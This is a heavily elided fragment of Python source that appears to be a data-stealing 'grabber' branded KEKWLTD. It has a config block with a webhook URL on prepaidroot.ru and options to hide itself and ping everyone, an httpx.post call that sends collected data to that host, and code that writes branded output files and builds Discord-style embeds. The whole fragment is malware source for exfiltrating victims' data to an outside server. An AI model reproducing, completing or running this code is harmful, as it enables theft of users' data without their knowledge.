...
httpx.post("https://prepaidroot.ru/relay/download", json=data)
...
kekwltd = "Powered by prepaidroot.ru"

__config__ = {
    'yourwebhookurl': "https://prepaidroot.ru/relay",
    'hide': 'yes',
    'ping': 'yes',
    'pingtype': 'everyone',
    'fake_error':'no',
        ...
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    ...
                    return
                item['kekw_is_here'] = "https://prepaidroot.ru"
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("KEKWLTD | https://prepaidroot.ru\n\n")
            ...
            'embeds': [
                {
                    ...
                    'footer': {
                        'text': 'KEKWLTD・https://prepaidroot.ru'
                    }
                }
            ]
        }
...
def writeforfile(data, name):
    ...
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"KEKWLTD | https://prepaidroot.ru\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
